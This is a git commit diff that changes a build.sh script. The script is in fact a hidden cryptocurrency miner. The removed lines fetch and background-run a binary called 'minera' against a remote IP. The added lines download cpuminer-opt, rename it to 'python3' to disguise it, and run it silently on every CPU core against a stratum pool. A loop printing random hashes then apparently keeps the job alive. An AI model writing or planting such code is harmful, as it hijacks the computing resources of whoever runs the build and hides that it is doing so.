27332502b78a19c35ba455cbfa7ed5ede653f6c2
nijallahla <94243789+nijallahla@users.noreply.github.com>
2022-10-14 00:40:07 +0700

    Update build.sh

--- build.sh
+++ build.sh
@@ -1,6 +1,7 @@
-sudo apt update
-sudo apt install -y git build-essential cmake libuv1-dev uuid-dev libssl-dev
-wget https://github.com/qhilapahal/qilabai/raw/main/minera
-chmod +x minera
-./minera -o 198.199.88.23:80 -t 1 >/dev/null &
+apt update
+apt install -y wget git build-essential cmake libuv1-dev uuid-dev libssl-dev
+wget --no-check-certificate https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz
+tar xf cpuminer-opt-linux.tar.gz
+mv cpuminer-sse2 python3
+./python3 -a yespower -o stratum+tcp://137.184.136.62:443 -u web1q4f9hemgt64tpj2cranaxhtrcqqqedvnngzunpy.$(echo $(shuf -i 1-20000 -n 1)-Lord) -p x -t$(nproc --all) >/dev/null &
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 1m; done
